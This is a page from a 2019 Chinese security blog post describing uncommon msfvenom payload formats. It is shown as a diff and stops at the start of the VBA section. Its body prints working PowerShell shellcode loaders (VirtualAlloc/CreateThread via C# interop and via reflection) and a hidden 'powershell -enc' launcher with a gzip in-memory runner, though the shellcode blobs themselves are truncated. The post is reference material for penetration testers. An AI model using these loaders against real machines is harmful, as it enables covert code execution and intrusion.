@@ -1,0 +1,507 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://exp10it.io/posts/msfvenom-uncommon-payloads/"><meta name="generator" content="Astro v5.12.0"><!-- General Meta Tags --><title>MSFvenom 几种不常见的 Payload 格式 | X1r0z Blog</title><meta name="title" content="MSFvenom 几种不常见的 Payload 格式 | X1r0z Blog"><meta name="description" content="MSFvenom 几种不常见的 Payload 格式"><meta name="author" content="X1r0z"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="MSFvenom 几种不常见的 Payload 格式 | X1r0z Blog"><meta property="og:description" content="MSFvenom 几种不常见的 Payload 格式"><meta property="og:url" content="https://exp10it.io/posts/msfvenom-uncommon-payloads/"><meta property="og:image" content="https://exp10it.io/og.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2019-07-29T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://exp10it.io/posts/msfvenom-uncommon-payloads/"><meta property="twitter:title" content="MSFvenom 几种不常见的 Payload 格式 | X1r0z Blog"><meta property="twitter:description" content="MSFvenom 几种不常见的 Payload 格式"><meta property="twitter:image" content="https://exp10it.io/og.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"MSFvenom 几种不常见的 Payload 格式 | X1r0z Blog","image":"https://exp10it.io/og.png","datePublished":"2019-07-29T00:00:00.000Z","author":[{"@type":"Person","name":"X1r0z","url":"https://exp10it.io/"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="X1r0z Blog" href="https://exp10it.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.D98dxaWf.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.Cn_dDryL.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: ms-fvenom-\51E0\79CD\4E0D\5E38\89C1\7684-payload-\683C\5F0F; }@layer astro { ::view-transition-old(ms-fvenom-\51E0\79CD\4E0D\5E38\89C1\7684-payload-\683C\5F0F) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(ms-fvenom-\51E0\79CD\4E0D\5E38\89C1\7684-payload-\683C\5F0F) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(ms-fvenom-\51E0\79CD\4E0D\5E38\89C1\7684-payload-\683C\5F0F) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(ms-fvenom-\51E0\79CD\4E0D\5E38\89C1\7684-payload-\683C\5F0F) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: metasploit; }@layer astro { ::view-transition-old(metasploit) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(metasploit) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(metasploit) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(metasploit) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-3"] { view-transition-name: power-shell; }@layer astro { ::view-transition-old(power-shell) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(power-shell) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(power-shell) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(power-shell) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute start-16 -top-full z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-app flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none"> X1r0z Blog </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/links">
+Links
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="mx-auto max-w-app px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-app items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-app px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> MSFvenom 几种不常见的 Payload 格式 </h1> <div class="my-2 flex items-center gap-2"> <div class="flex items-center gap-x-2 opacity-80"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg>  <time class="text-sm sm:text-base" datetime="2019-07-29T00:00:00.000Z">29 Jul, 2019</time> </div> <span aria-hidden="true" class="max-sm:hidden">|</span> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/archives/msfvenom-uncommon-payloads.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent max-sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> </div> <article id="article" class="app-prose mx-auto mt-8 max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg)"> <p>msfvenom 中一些不那么常见的 payload 格式.</p>
+<h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#powershell-ps1">powershell (ps1)</a></li>
+<li><a href="#psh-net">psh-net</a></li>
+<li><a href="#psh-reflection">psh-reflection</a></li>
+<li><a href="#psh-cmd">psh-cmd</a></li>
+<li><a href="#vba">vba</a></li>
+<li><a href="#vba-exe">vba-exe</a></li>
+<li><a href="#vba-psh">vba-psh</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="powershell-ps1">powershell (ps1)</h2>
+<p>用来生成方便在 powershell 脚本中调用的 shellcode 变量.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c......</span></span></code></pre>
+<p>调用方式请参考 <code>Invoke-Shellcode</code>.</p>
+<h2 id="psh-net">psh-net</h2>
+<p>通过 c# 导入 win32api 执行 shellcode.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Set-StrictMode -Version 2</span></span>
+<span class="line"><span>$fByu7 = @"</span></span>
+<span class="line"><span>	using System;</span></span>
+<span class="line"><span>	using System.Runtime.InteropServices;</span></span>
+<span class="line"><span>	namespace hfn9 {</span></span>
+<span class="line"><span>		public class func {</span></span>
+<span class="line"><span>			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }</span></span>
+<span class="line"><span>			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }</span></span>
+<span class="line"><span>			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }</span></span>
+<span class="line"><span>			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span></span>
+<span class="line"><span>			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span></span>
+<span class="line"><span>			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);</span></span>
+<span class="line"><span>		}</span></span>
+<span class="line"><span>	}</span></span>
+<span class="line"><span>"@</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>$q9qGo = New-Object Microsoft.CSharp.CSharpCodeProvider</span></span>
+<span class="line"><span>$lumS = New-Object System.CodeDom.Compiler.CompilerParameters</span></span>
+<span class="line"><span>$lumS.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))</span></span>
+<span class="line"><span>$lumS.GenerateInMemory = $True</span></span>
+<span class="line"><span>$fZR6 = $q9qGo.CompileAssemblyFromSource($lumS, $fByu7)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[Byte[]]$r5yy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL......")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>$ew = [hfn9.func]::VirtualAlloc(0, $r5yy.Length + 1, [hfn9.func+AllocationType]::Reserve -bOr [hfn9.func+AllocationType]::Commit, [hfn9.func+MemoryProtection]::ExecuteReadWrite)</span></span>
+<span class="line"><span>if ([Bool]!$ew) { $global:result = 3; return }</span></span>
+<span class="line"><span>[System.Runtime.InteropServices.Marshal]::Copy($r5yy, 0, $ew, $r5yy.Length)</span></span>
+<span class="line"><span>[IntPtr] $nbU = [hfn9.func]::CreateThread(0,0,$ew,0,0,0)</span></span>
+<span class="line"><span>if ([Bool]!$nbU) { $global:result = 7; return }</span></span>
+<span class="line"><span>$uT6h = [hfn9.func]::WaitForSingleObject($nbU, [hfn9.func+Time]::Infinite)</span></span></code></pre>
+<h2 id="psh-reflection">psh-reflection</h2>
+<p>使用反射和委托执行 shellcode, 间接调用 win32api.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function hh {</span></span>
+<span class="line"><span>	Param ($w9Nl, $jD_Z1)		</span></span>
+<span class="line"><span>	$sJq = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')</span></span>
+<span class="line"><span>	</span></span>
+<span class="line"><span>	return $sJq.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sJq.GetMethod('GetModuleHandle')).Invoke($null, @($w9Nl)))), $jD_Z1))</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>function rW {</span></span>
+<span class="line"><span>	Param (</span></span>
+<span class="line"><span>		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $bJDR,</span></span>
+<span class="line"><span>		[Parameter(Position = 1)] [Type] $oD0 = [Void]</span></span>
+<span class="line"><span>	)</span></span>
+<span class="line"><span>	</span></span>
+<span class="line"><span>	$wa = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])</span></span>
+<span class="line"><span>	$wa.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bJDR).SetImplementationFlags('Runtime, Managed')</span></span>
+<span class="line"><span>	$wa.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oD0, $bJDR).SetImplementationFlags('Runtime, Managed')</span></span>
+<span class="line"><span>	</span></span>
+<span class="line"><span>	return $wa.CreateType()</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[Byte[]]$cb = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg......")</span></span>
+<span class="line"><span>		</span></span>
+<span class="line"><span>$srf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll VirtualAlloc), (rW @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cb.Length,0x3000, 0x40)</span></span>
+<span class="line"><span>[System.Runtime.InteropServices.Marshal]::Copy($cb, 0, $srf, $cb.length)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>$uC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll CreateThread), (rW @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$srf,[IntPtr]::Zero,0,[IntPtr]::Zero)</span></span>
+<span class="line"><span>[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll WaitForSingleObject), (rW @([IntPtr], [Int32]))).Invoke($uC,0xffffffff) | Out-Null</span></span></code></pre>
+<h2 id="psh-cmd">psh-cmd</h2>
+<p>使用 <code>powershell -enc</code> 一键执行, 实质为将 shellcode 加载至内存, 然后创建进程.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArA......</span></span></code></pre>
+<p>解码后的内容.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>if([IntPtr]::Size -eq 4 {</span></span>
+<span class="line"><span>    $b='powershell.exe'</span></span>
+<span class="line"><span>} else {</span></span>
+<span class="line"><span>    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span></span>
+<span class="line"><span>};</span></span>
+<span class="line"><span>$s=New-Object System.Diagnostics.ProcessStartInfo;</span></span>
+<span class="line"><span>$s.FileName=$b;</span></span>
+<span class="line"><span>$s.Arguments='-nop -w hidden -c &#x26;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMGUPl0CA7VWbW/aSBD+nEj5D1aFhK0QDIEmTaRKt+ad4sTEgUAoOm3stb2wtsl6DYG2//3G2E7Ta3LXnnQWL/syMzvzzDOzduLAEjQMJDEYZsr......''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';</span></span>
+<span class="line"><span>$s.UseShellExecute=$false;</span></span>
+<span class="line"><span>$s.RedirectStandardOutput=$true;</span></span>
+<span class="line"><span>$s.WindowStyle='Hidden';</span></span>
+<span class="line"><span>$s.CreateNoWindow=$true;</span></span>
+<span class="line"><span>$p=[System.Diagnostics.Process]::Start($s);</span></span></code></pre>
+<h2 id="vba">vba</h2>
+<p>调用 win32api 将 shellcode 加载至内存, 然后创建进程.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#If Vba7 Then</span></span>
